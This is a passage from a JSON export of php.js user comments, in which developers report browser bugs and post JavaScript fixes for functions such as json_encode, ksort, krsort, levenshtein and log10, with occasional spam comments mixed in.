in a string into a function object, which can then be called. It cannot affect local variables because the code runs in a separate scope."},{"date":"2012-04-06 02:47:13","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Pavel: Ok, good point, but it still suffers from the ability to set globals. So while it may be a little safer, it still doesn't solve the root problem of complete encapsulation, though if the regex are working, eval() will be equally safe. I suggest this be refactored to use a real parser if we're going to do anything about it."}],"json_encode":[{"date":"2009-06-17 06:06:07","author":"T.J. Leahy","url":"","comment":"This function should check to see if the browser has native JSON encoding first (IE8, FF 3.5) and use that when available. Would make it faster and safer then running the object against multiple regular expressions. See http:\/\/hacks.mozilla.org\/2009\/06\/security-performance-native-json\/\n\n[code]\nif (typeof JSON == \"object\" && typeof JSON.stringify == \"function\") {\n    return JSON.stringify(str_json);\n}\n[\/code]\n"},{"date":"2009-06-18 06:55:21","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@T. J. Leahy:  Fixed in SVN. Thanks for the report! See also my note at http:\/\/phpjs.org\/functions\/json_decode:456#comment_64602"},{"date":"2009-10-18 02:38:03","author":"Michael White","url":"http:\/\/getsprink.com\/","comment":"The part that uses native browser JSON objects should be contained in a try\/catch block and return the proper value in accordance with how PHP handles bad input. (The only bad input in PHP seems to be resource objects). Should we return \"null\" or an empty string or false here upon error?\n\n[CODE]\ntry {\n    return json.stringify(mixed_val);\n}\ncatch(err) {\n    return mixed_val;\n}\n\n[\/CODE]"},{"date":"2009-10-18 07:20:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Michael: If you try it with a resource object, what does it return in PHP?  See also my comment in json_decode()."},{"date":"2009-10-20 03:13:43","author":"Michael White","url":"http:\/\/getsprink.com\/","comment":"@kevin I didn't know what it returned because last time I ran into this in PHP I was encountering an infinite loop because of it (long story). However, I tested it in a simple script just now and I'm getting NULL output. It also throws a PHP error warning that the type is unsupported. This happens if a resource is present anywhere in the data to be encoded."},{"date":"2009-10-25 14:08:02","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Ok great that you did the research on this Michael!\n\nI've implemented your fixes: \nhttp:\/\/github.com\/kvz\/phpjs\/commit\/cae72555c08c11ec416f1c8ecfcd5e42509cb46d"},{"date":"2009-10-26 00:49:03","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Have made a fix (NULL to null) and added support for json_last_error(); see commits at http:\/\/github.com\/kvz\/phpjs\/commits\/master\/"},{"date":"2009-11-07 18:14:41","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Excellent!"},{"date":"2010-04-20 01:52:35","author":"felix","url":"","comment":"Hi\n\nas already listed above, PHPJS_Resource is not defined. This triggers an unexpected error for me at least if I try to use this function standalone (FF 3.5.9).\nHow about changing lines ## 95-97 to:\n[CODE]\nif (PHPJS_Resource && value instanceof PHPJS_Resource) {                        \n    throw new SyntaxError('json_encode');\n}\n[\/CODE]\n?"},{"date":"2010-04-20 08:00:39","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Fixed in Git. Thanks for pointing out the problem, felix. Btw, one can't only check for a variable like that (as one can in PHP) since your example will also cause an undefined error. In JS, you have to test a variable as a property, including against the global:\n\ne.g., these are ok:\nif (window.someVar) {}\nif (this.someVar) {}\n\nbut this is not:\nif (someVar) {}\n"},{"date":"2010-11-05 10:32:30","author":"tony","url":"","comment":"this function has a problem with ie8.. it says it expects an hex number near line 50"},{"date":"2010-11-05 14:14:37","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@tony: Can you give the sample you are trying to encode..."},{"date":"2012-02-09 14:53:07","author":"4545","url":"2423","comment":"432"},{"date":"2012-03-22 13:56:33","author":"????? ????","url":"http:\/\/an3m1.com\/","comment":"News articles and new in the world of tourism \n"}],"key":[{"date":"2009-12-25 13:23:17","author":"Riddler","url":"http:\/\/www.frontierwebdev.com\/","comment":"> if (pointers.indexOf(arr) === -1) {\r\n\r\nError occurred in IE - Object doesn't support this property or method\r\n\r\nArray object has no \"indexOf\" method.\r\n"},{"date":"2009-12-26 07:13:28","author":"Theriault","url":"","comment":"To elaborate on Riddler\u2019s post, indexOf isn\u2019t supported by Internet Explorer\u2019s JScript, so this won\u2019t work in any version of the browser, neither will the other functions: next, prev, pos, current, end, and reset."},{"date":"2009-12-26 07:42:23","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Riddler: Ouch, thanks for that. Had a bunch of other functions to fix; now done in Git. I'm really too spoiled working usually in a Firefox-only environment.\n@Theriault: Just saw your comment now. Yes, thanks, I caught those, and also a number of others. All should be fixed now. Thank heavens for Notepad++'s find files feature (I know IE does support the string indexOf at least, so I avoided doing anything for those)."}],"krsort":[{"date":"2008-11-25 22:24:14","author":"Chris Wade","url":"","comment":"I found that init'ing tmp_arr to {} was problematic and changed it to var tmp_arr = [].\r\n\r\nSpecifically I was unable to get the length of the object... this change doesn't seem to have harmed the function at all.\r\n\r\nAlso it may stray from the PHP manual a bit but I found it more useful to return the array than to return true, because the original array wasn't being overwritten in my case.  I'm using server-side JScript with Classic ASP."},{"date":"2008-12-01 08:35:21","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Chris Wade: Did you also test it with associative arrays (js objects)?"},{"date":"2009-01-17 06:40:16","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"And here are krsort() and ksort() with the new more readily extensible infrastructure (and speeded krsort()):\r\n\r\n[CODE=&quot;Javascript&quot;]function krsort(array, sort_flags) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: GeekFG (http:\/\/geekfg.blogspot.com)\r\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +   improved by: Brett Zamir\r\n    \/\/ %          note: The examples are correct, this is a new way\r\n    \/\/ *     example 1: data = {2: 'van', 3: 'Zonneveld', 1: 'Kevin'};\r\n    \/\/ *     example 1: krsort(data);\r\n    \/\/ *     results 1: data == {3: 'Kevin', 2: 'van', 1: 'Zonneveld'}\r\n    \/\/ *     returns 1: true\r\n \r\n    var tmp_arr={}, keys=[], sorter, i, key;\r\n \r\n\tswitch (sort_flags) {\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale (set with  i18n_loc_set_default() as of PHP6)\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_NUMERIC': \/\/ compare items numerically\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(b - a);\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t\tcase 'SORT_REGULAR': \/\/ compare items normally (don't change types)\r\n\t\tdefault:\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\tif (a &lt; b)\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\tif (a &gt; b)\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\treturn 0;\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t}\r\n \r\n    \/\/ Make a list of key names\r\n    for (key in array) {\r\n        keys.push(key);\r\n    }\r\n \r\n    keys.sort(sorter);\r\n \r\n    \/\/ Rebuild array with sorted key names\r\n    for (i = 0; i &lt; keys.length; i++) {\r\n        key = keys[i];\r\n        tmp_arr[key] = array[key];\r\n        delete array[key];\r\n    }\r\n    for (i in tmp_arr) {\r\n        array[i] = tmp_arr[i]\r\n    }\r\n \r\n    return true;\r\n}\r\n\r\n function ksort(array, sort_flags) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: GeekFG (http:\/\/geekfg.blogspot.com)\r\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +   improved by: Brett Zamir\r\n    \/\/ %          note: The examples are correct, this is a new way\r\n    \/\/ *     example 1: data = {2: 'van', 3: 'Zonneveld', 1: 'Kevin'};\r\n    \/\/ *     example 1: ksort(data);\r\n    \/\/ *     results 1: data == {1: 'Kevin', 2: 'van', 3: 'Zonneveld'}\r\n    \/\/ *     returns 1: true\r\n \r\n    var tmp_arr={}, keys=[], sorter, i, key;\r\n \r\n\tswitch (sort_flags) {\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale (set with  i18n_loc_set_default() as of PHP6)\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_NUMERIC': \/\/ compare items numerically\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(a - b);\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t\tcase 'SORT_REGULAR': \/\/ compare items normally (don't change types)\r\n\t\tdefault:\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\tif (a &gt; b)\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\tif (a &lt; b)\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\treturn 0;\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t}\r\n \r\n    \/\/ Make a list of key names\r\n    for (key in array) {\r\n        keys.push(key);\r\n    }\r\n \r\n    keys.sort(sorter);\r\n \r\n    \/\/ Rebuild array with sorted key names\r\n    for (i = 0; i &lt; keys.length; i++) {\r\n        key = keys[i];\r\n        tmp_arr[key] = array[key];\r\n        delete array[key];\r\n    }\r\n    for (i in tmp_arr) {\r\n        array[i] = tmp_arr[i]\r\n    }\r\n \r\n    return true;\r\n}[\/CODE]"},{"date":"2009-01-17 14:00:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Again: great work.\r\n\r\nIt's a shame we don't have a php.core.js in which we could just have an array_sorter() with some arguments to diversify in ksort krsort asort arsort, etc.\r\n\r\nSame goes for all the intersect &amp; diff functions that only differ a couple of characters. More (maintenance) work for us due to duplication.\r\n\r\nBut on the other hand: I think it's worth it because we can uphold the philosophy of a lot of independent components that can just be used as is. I bet the majority of PHP.JS  users just copy the functions they need and be on their way.\r\n\r\nWe could work on a compiler-like feature that just generates all the different sorters based on one template we maintain. But concidering we're only talking about 20 functions or so: that's maybe more work than just distributing changes by hand (copy&amp;paste). Thanks Brett. You're a real PHP.JS pitbull :)"},{"date":"2009-01-17 15:03:07","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Considering the last story about duplication... I'm struggling with the same problem trying to include the BCMath functions \r\nhttp:\/\/svn.plutonia.nl\/projects\/phpjs\/browser\/trunk\/_unported\/bc\r\n\r\nWhich were donated in my mail by a guy named Lance. They all require a shared bc library with 10 functions or something. \r\n\r\nThere is no global required include in PHP.JS that would be the obvious place for these shared functions. And I'm still convinced that this library should go without such a requirement.\r\n\r\nStill this will mean, either:\r\nOR\r\n- awfully big standalone functions, extreme duplication\r\n- a compiler that defeats duplication. from a developer's perspective, at least.\r\n- a core include with shared functions that is required as a dependency\r\n- make use of the existing dependency system. that would mean adding non-existent-php functions as if they were real php functions and adding them as dependencies. We could store them in a category: phpjssupport. But that would require creating exceptions throughout the project, e.g.: 'SKIP phpjssupport dir when downloading manuals!'\r\n- no bcmath functions at all\r\n\r\nIt's an imperfect world."},{"date":"2009-01-18 03:44:43","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"As for the output buffering issue ideally having a global too, would the following be part of your compiler or dependency idea?\r\n\r\nJust specify code like this with each relevant function:\r\n\r\n[CODE=&quot;Javascript&quot;]if (!window.php_js) {\r\n    window.php_js = {};\r\n}\r\nif (!window.php_js.output_buffer) {\r\n    window.php_js.output_buffer = document.createDocumentFragment();\r\n}[\/CODE]\r\n\r\nor\r\n\r\n[CODE=&quot;Javascript&quot;]if (!window.php_js) {\r\n    window.php_js = {};\r\n}\r\nif (!window.php_js.sort_helper1) {\r\n    window.php_js.sort_helper1 = function () {\r\n         ...\r\n    }\r\n}[\/CODE]\r\n\r\nThe above could be inside or outside the functions. Outside would be easier to ignore and avoid repeated execution, but inside might be more user friendly and would only increase space if the user didn't realize they could omit it in repeat cases, but should barely affect execution time, since the functions would only be declared once.\r\n\r\nI think we do need something like this (whatever option you like) because it would just get out of hand for memory and execution to include these fully and without conditionality within each function."},{"date":"2012-04-11 15:44:49","author":"????? ?????? ? ?????","url":"http:\/\/an3m1.com\/","comment":"I wonder how you got so good. HaHa ! This is really a fascinating blog, lots of stuff that I can get into. One thing I just want to say is that your design is so perfect ! You certainly know how to get a girls attention ! I\u2019m glad that you\u2019re here. I feel like I\u2019ve learned something new by being here\n"}],"ksort":[{"date":"2008-07-29 07:02:35","author":"Abhijeet Bagul","url":"","comment":"Your all functions are nice...\r\n\r\nIt really helped me lot."},{"date":"2009-01-14 02:55:24","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi,\r\n\r\nI don't think that this function is working. The last line does not replace the array, since in JavaScript, as a whole object, the arrays (though their values are passed in by reference), are passed in by value (you cannot, for example, reassign or delete the passed-in array as a whole). \r\n\r\nYou can confirm this with something like this:\r\n\r\n[CODE=&quot;Javascript&quot;]function changeArr (arr) {\r\n    arr = [3, 2, 1];\r\n}\r\nvar a = [1, 2, 3];\r\nchangeArr(a);\r\nalert(a); \/\/ still 1, 2, 3[\/CODE]\r\n\r\n\r\nHowever, you can delete and then rebuild its contents, modifying the function as such:\r\n\r\n[CODE=&quot;Javascript&quot;]function ksort(array, sort_flags) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: GeekFG (http:\/\/geekfg.blogspot.com)\r\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ %          note: The examples are correct, this is a new way\r\n    \/\/ *     example 1: data = {2: 'van', 3: 'Zonneveld', 1: 'Kevin'}; \r\n    \/\/ *     example 1: ksort(data);\r\n    \/\/ *     results 1: data == {1: 'Kevin', 2: 'van', 3: 'Zonneveld'}\r\n    \/\/ *     returns 1: true\r\n    \r\n    var tmp_arr = {}, keys = [], sorter = false;\r\n    \r\n    \/\/ For now only SORT_NUMERIC has a custom sorter\r\n    \/\/ and SORT_REGULAR, SORT_STRING, and SORT_LOCALE_STRING\r\n    \/\/ are all handled with the default sorter \r\n    if (sort_flags == 'SORT_NUMERIC') {\r\n        sorter = function (a, b) {\r\n            return(a - b);\r\n        };\r\n    }\r\n    \r\n    \/\/ Make a list of key names\r\n    for (var key in array) { \r\n        keys.push(key);\r\n    }\r\n     \r\n    \/\/ Sort key names\r\n    try {\r\n        if (sorter !== false) {\r\n            keys.sort(sorter);\r\n        } else {\r\n            keys.sort();\r\n        }\r\n    }\r\n    catch (e) {\r\n        return false;\r\n    }\r\n    \r\n    \/\/ Rebuild array with sorted key names\r\n    for (var i = 0; i &lt; keys.length; i++) {\r\n        key = keys[i];\r\n        tmp_arr[key] = array[key]; \r\n        delete array[key];\r\n    } \r\n    for (i in tmp_arr) {\r\n        array[i] = tmp_arr[i]\r\n    }\r\n    return true; \r\n}[\/CODE]"},{"date":"2009-01-14 03:24:14","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"I also used the same basic approach just mentioned in this asort() as well, but I needed a slightly different approach since I could not rely on values being unique, as keys were for ksort().\r\n\r\n[CODE=&quot;Javascript&quot;]function asort (inputArr) {\r\n    function bubbleSort(keyArr, inputArr) {\r\n        for (var i = inputArr.length-2; i &gt;= 0; i--) {\r\n            for (var j=0; j &lt;= i; j++) {\r\n                if (inputArr[j+1] &lt; inputArr[j]) {\r\n                    var tempValue = inputArr[j];\r\n                    inputArr[j] = inputArr[j+1];\r\n                    inputArr[j+1] = tempValue;\r\n                    var tempKeyVal = keyArr[j];\r\n                    keyArr[j] = keyArr[j+1];\r\n                    keyArr[j+1] = tempKeyVal;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    var valArr = [], keyArr=[];\r\n    for (var k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        keyArr.push(k);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        bubbleSort(keyArr, valArr); \/\/ Sort our new temporary arrays\r\n    }\r\n    catch(e) {\r\n        return false;\r\n    }\r\n    for (i=0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[keyArr[i]] = valArr[i];\r\n    }\r\n    return true;\r\n}\r\n$fruits = {&quot;d&quot; : &quot;lemon&quot;,  &quot;a&quot; : &quot;orange&quot;, &quot;b&quot; : &quot;orange&quot;, &quot;c&quot; : &quot;orange&quot;};\r\nasort($fruits); \r\nvar $output = '';\r\nfor (var $key in $fruits) {\r\n    $val = $fruits[$key];\r\n    $output += $key+' = '+$val+&quot;\\n&quot;;\r\n}\r\nalert($output);\r\n\/*\r\nc = apple\r\nb = banana\r\nd = lemon\r\na = orange\r\n*\/\r\n[\/CODE]"},{"date":"2009-01-14 03:27:02","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Whoops, sorry the function just given works, but the example doesn't! (I was playing around with the values and forgot to switch back). The example section should be:\r\n\r\n[CODE=&quot;Javascript&quot;]$fruits = {&quot;d&quot; : &quot;lemon&quot;,  &quot;a&quot; : &quot;orange&quot;, &quot;b&quot; : &quot;banana&quot;, &quot;c&quot; : &quot;apple&quot;};\r\nasort($fruits); \r\nvar $output = '';\r\nfor (var $key in $fruits) {\r\n    $val = $fruits[$key];\r\n    $output += $key+' = '+$val+&quot;\\n&quot;;\r\n}\r\nalert($output);\r\n\/*\r\nc = apple\r\nb = banana\r\nd = lemon\r\na = orange\r\n*\/\r\n[\/CODE]"},{"date":"2009-01-14 03:40:31","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Lastly, while it looks like your other sort functions are fine, krsort() does need to be changed too. For that, you can use the ksort() I sent two posts before with the line &quot;keys.reverse();&quot; added after the try-catch block."},{"date":"2009-01-14 04:03:14","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, I guess that wasn't all. You can also get arsort() by changing this line in asort():\r\n\r\n[CODE=&quot;Javascript&quot;]if (inputArr[j+1] &lt; inputArr[j]) {[\/CODE]\r\n\r\nto\r\n\r\n[CODE=&quot;Javascript&quot;]if (inputArr[j+1] &gt; inputArr[j]) {[\/CODE]\r\n\r\nAnd we can also trivially get usort() and uksort() by changing sort flags in the corresponding functions to callbacks (uasort() would not be as easy though, since my version presently depends on the sorter for internal uses as well):\r\n\r\n[CODE=&quot;Javascript&quot;]function usort( array, sorter ) {\r\n    if (typeof sorter === 'string') {\r\n        sorter = window[sorter];\r\n    }\r\n    if (sorter !== false) {\r\n        array.sort(sorter);\r\n    } else {\r\n        array.sort();\r\n    }   \r\n    return true;\r\n}\r\n[\/CODE]\r\n\r\nand\r\n\r\n[CODE=&quot;Javascript&quot;]function uksort(array, sorter) {\r\n    if (typeof sorter === 'string') {\r\n        sorter = window[sorter];\r\n    }\r\n\r\n    var tmp_arr = {}, keys = [];\r\n        \r\n    \/\/ Make a list of key names\r\n    for (var key in array) { \r\n        keys.push(key);\r\n    }\r\n     \r\n    \/\/ Sort key names\r\n    try {\r\n        if (sorter) {\r\n            keys.sort(sorter);\r\n        } else {\r\n            keys.sort();\r\n        }\r\n    }\r\n    catch (e) {\r\n        return false;\r\n    }\r\n    \r\n    \/\/ Rebuild array with sorted key names\r\n    for (var i = 0; i &lt; keys.length; i++) {\r\n        key = keys[i];\r\n        tmp_arr[key] = array[key]; \r\n        delete array[key];\r\n    } \r\n    for (i in tmp_arr) {\r\n        array[i] = tmp_arr[i]\r\n    }\r\n    return true; \r\n}\r\n\r\nvar arr =  {&quot;d&quot; : &quot;lemon&quot;,  &quot;a&quot; : &quot;orange&quot;, &quot;b&quot; : &quot;banana&quot;, &quot;c&quot; : &quot;apple&quot;};\r\nuksort(arr, function (a, b) {\r\n            if (a &gt; b) return 1;\r\n            if (b &lt; a) return -1;\r\n            return 0;\r\n        });\r\n[\/CODE]\r\n\r\nThe only other array functions left (besides uasort() as mentioned above) now are natsort, natcasesort, and array_multisort. (Of course, we have to still support the flags on the existing ones, etc.)"},{"date":"2009-01-14 04:10:49","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Lastly for now (I hope), sort() and rsort() (and usort()) need to be changed along the lines of asort() (and uasort()) to allow object sorting..."},{"date":"2009-01-14 11:55:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Added! You're on steroids or something? ;)"},{"date":"2009-01-18 04:21:16","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"No, no steroids, but maybe the (healthy) mental equivalent... I was having come concentration problems, and my doctor had blood tests done which showed a borderline B12 deficiency. I started taking LIQUID vitamin B12 (16,666% percent of RDA!) and it has increased my mental endurance enormously. I've taken vitamin B6 in the past which very significantly helps my atrocious working\/auditory memory, but I have to find the right balance, or otherwise, daily B6 in the regular dose really does have a counterproductive effect for me (not for B12 apparently in my experience). \r\n\r\nA better solution to the latter problem has been DHA (in omega-3 fatty acids, especially fish oil), and that has also been just awesome for working memory (though I think it can be a little dehydrating to take it every day). I really think there are inadequacies in our food supply, with current farming practices only replenishing the soil with the nutrients needed for mere growth (like nitrogen), from what I've heard. \r\n\r\nJust heard a TV special about how a particularly long-lived group of Asians lived longer due to vitamins in their soil or something (the special was in Chinese (I'm living in China), and my Chinese is still just so-so).\r\n\r\nNow how's that for really off-topic?"},{"date":"2010-05-31 16:41:04","author":"ALastorZ","url":"","comment":"I've needed this useful addition:\n\n[CODE]\n\n\tcase 'SORT_STRNUMERIC': \/\/ compare items by first number in string\n\t\t    sorter = function (a, b) {\n\t\t\t\ta = Number(String(a).match(\/(\\d*)\/)[1]);\n\t\t\t\tb = Number(String(b).match(\/(\\d*)\/)[1]);\n                return (a - b);\n            };\n            break;\n\n[\/CODE]\t"},{"date":"2010-06-19 16:22:07","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ ALastorZ: We won't include it as it isn't a PHP feature, but you make a good point as I think PHP doesn't care for strings when doing a SORT_NUMERIC. Fixed: https:\/\/github.com\/kvz\/phpjs\/commit\/c175338a592db72bc4140627c9b044702ceed26a\n"},{"date":"2010-09-24 14:38:07","author":"Lazy eyes","url":"","comment":"I've got a set of keys\n\n[CODE]\n[1000000] => 1\n[1100000] => 1\n[850000] => 5\n[880000] => 2\n[890000] => 4\n[\/CODE]\n\nit doesn't seem to work with different key lengths? Any fix for this?"},{"date":"2010-09-25 17:46:19","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Lazy eyes: Thanks for the input! Fixed in Git. The problem was\/is that while the default flag, SORT_REGULAR in PHP, by relying on original type, is able to distinguish numbers from strings, while in JS, using an object to simulate associative arrays, leads to the issue that all object keys being strings. I've now changed SORT_REGULAR to assume that any numeric string gets treated as though its original type were numeric. If you want to always treat as strings, or always treat as numbers, you can choose from the different flags instead."}],"levenshtein":[{"date":"2009-10-24 11:23:57","author":"Florian","url":"http:\/\/duran2.de\/felektro","comment":"Thanks for this wonderful script! I used it for my javascript based search engine.\nBut it seems if there's a little bug on your website: when you come on this site, it redirects you to a site with only digg buttons for example. It would be good if you fix that!"},{"date":"2009-10-25 14:09:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Florian: Yeah witnessed on a colleague's PC recently. Should be fixed now!"},{"date":"2009-10-25 14:10:14","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Florian: PS, was this by any chance Firefox 3.0?"},{"date":"2011-03-01 19:04:07","author":"Andrew Maxwell","url":"","comment":"1. It's always faster to access array elements than characters in a string. Always split it.\n2. This function is unnecessarily verbose. For most if not all circumstances, the following would more than suffice:\n[CODE]\n function levenshtein (s1, s2) {\n    if (s1===s2){return 0;}\n    if (s1.length===0){return s2.length;}\n    if (s2.length===0){return s1.length;}\n    var v0=[],v1=[], j=0, k=0;\n    s1=s1.split('');\n    s2=s2.split('');\n    for (j=0; j<=s1.length; j++){v0[j]=j;}\n    for (k=1; k<=s2.length; k++){\n        v1[0]=k;\n        for (j=0; j<s1.length; j++){v1[j+1]=Math.min(v0[j+1]+1, v1[j]+1, v0[j]+((s1[j]===s2[k-1])? 0: 1));}\n        var v_tmp = v0;\n        v0 = v1;\n        v1 = v_tmp;\n    }\n    return v0[s1.length];\n}\n[\/CODE]"},{"date":"2012-03-22 13:52:04","author":"????? ????? ????","url":"http:\/\/an3m1.com\/","comment":"New in the gaming world and all that exclusive games, visit the Portal Forums "},{"date":"2012-03-26 02:31:44","author":null,"url":"http:\/\/tessmore.nl","comment":"Not sure if it is shorter than Andrew Maxwell his version, but since it didn't make it.. I thought I give it a shot.\n\n[CODE]\n    function levenshtein(a, b) {\n      var i, j, r=[];\n      \n      r[0] = [];\n      r[0][0] = 0;\n      \n      for(i=1; i<=a.length; i++) {\n        r[i] = [];\n        r[i][0] = i;\n        \n        for(j=1; j<=b.length; j++) {\n          r[0][j] = j;\n          r[i][j] = Math.min(\n                      r[i-1][j]+1,\n                      r[i][j-1]+1, \n                      r[i-1][j-1] + (a[i-1]!==b[j-1])\n                    );\n        }\n      }    \n      \n      return r[a.length][b.length];\n    }\n[\/CODE]"}],"log":[{"date":"2008-10-14 23:31:45","author":"Philip Peterson","url":"","comment":"function log10(arg) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ *     example 1: log(10);\r\n    \/\/ *     returns 1: 1\r\n    \/\/ *     example 1: log(1);\r\n    \/\/ *     returns 1: 0\r\n        return Math.log(arg);\r\n}"},{"date":"2008-10-15 00:46:21","author":"Philip Peterson","url":"","comment":"Actually, a small fix:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\r\nfunction log10(arg) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ * example 1: log(10);\r\n    \/\/ * returns 1: 1\r\n    \/\/ * example 1: log(1);\r\n    \/\/ * returns 1: 0\r\n    return (arg == undefined || arg == 0) ? (&quot;-INF&quot;) : (arg &lt; 0) ? (&quot;NAN&quot;) : Math.log(arg);\r\n}\r\n\r\n[\/CODE]"},{"date":"2008-10-15 00:50:28","author":"Philip Peterson","url":"","comment":"In fact, log() has a similar discrepancy:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction log(arg, base) {\r\n \r\n    if (base === undefined) {\r\n        return Math.log(arg);\r\n    } else {\r\n        return (arg == undefined || arg == 0) ? (&quot;-INF&quot;) : (arg &lt; 0) ? (&quot;NAN&quot;) : (Math.log(arg)\/Math.log(base));\r\n    }\r\n}\r\n[\/CODE]\r\n\r\nI'm also not sure if I should be using === when I'm using == in this post and previous posts, so perhaps someone more knowledgeable about that sort of thing should check it out."},{"date":"2008-10-15 09:37:09","author":"Onno Marsman","url":"","comment":"Philip: Maybe you would want to look at this again:\r\n- Math.log return the natural logarithm with a base of e and not 10. I haven't tested it but I doubt PHP and javascript would return the same value with this implementation.\r\n- &quot;-INF&quot; and &quot;NaN&quot; are not valid javascript representations of these values. -Infinity and NaN (without quotes) should be used."},{"date":"2008-10-15 23:00:51","author":"Philip Peterson","url":"","comment":"Wow, strange, one would think that log() would be the common log and ln() (or something) would be the natural log.  Oh well, here's the revised code, with your other suggestions as well:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction log(arg, base) {\r\n \r\n    if (base === undefined) {\r\n        return Math.log(arg);\r\n    } else {\r\n        return (arg == undefined || arg == 0) ? (-Infinity) : (arg &lt; 0) ? (NaN) : (Math.log(arg)\/Math.log(base));\r\n    }\r\n}\r\n\r\nfunction log10(arg) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ * example 1: log10(10);\r\n    \/\/ * returns 1: 1\r\n    \/\/ * example 1: log10(1);\r\n    \/\/ * returns 1: 0\r\n    return (arg == undefined || arg == 0) ? (-Infinity) : (arg &lt; 0) ? (NaN) : Math.log(arg)\/Math.log(10);\r\n}\r\n[\/CODE]\r\n\r\nhow's it look?"},{"date":"2008-10-16 09:35:25","author":"Onno Marsman","url":"","comment":"Philip: I've checked for the behavior of the already present log function and it seems to already return NaN and -Infinity in the cases you've specified. So I don't see why the extra checks are necessary.\r\n\r\nThis is the same for your log10 function.\r\nI've added log10 to the repositroy without the checks and credited you for your efforts. It will be visible on this site as soon as Kevin runs his scripts to do so."},{"date":"2008-10-20 18:38:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman &amp; Philip Peterson: Thanks for both of your efforts. I've ran the script"},{"date":"2012-03-22 13:52:35","author":"????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"New in the world of news and news of new articles added "}],"log10":[{"date":"2008-11-13 19:51:02","author":"Tod Gentille","url":"www.syncorsystems.com","comment":"I would suspect it would be more efficient to use the Javascript constant Math.LN10, the body of the  function is then\r\n[CODE=&quot;Javascript&quot;]\r\nreturn Math.log(arg)\/Math.LN10;\r\n[\/CODE]"},{"date":"2008-11-13 23:23:32","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Tod Gentille: I think so too. Thank you very much for pointing that out!"}],"long2ip":[{"date":"2008-04-24 08:38:57","author":"Will","url":"","comment":"Great job!\r\nVery happy to see that is your recently post.\r\nI am lucky, because of you!"},{"date":"2009-08-30 09:05:15","author":"John","url":"www.whatsmyip.org","comment":"Cool idea. But this doesn't work. If you use ip2long in php, and get the result of that and pass it to this long2ip javascript function, what you get is NOT the original IP you started with. If you add (256^4)\/2 to the long, you'll get the 2nd, 3rd and 4th sections correct but the first section of the IP will still be off.\n\nlong2ip\/php accepts the signed int, but apparently the javascript version is looking for an unsigned 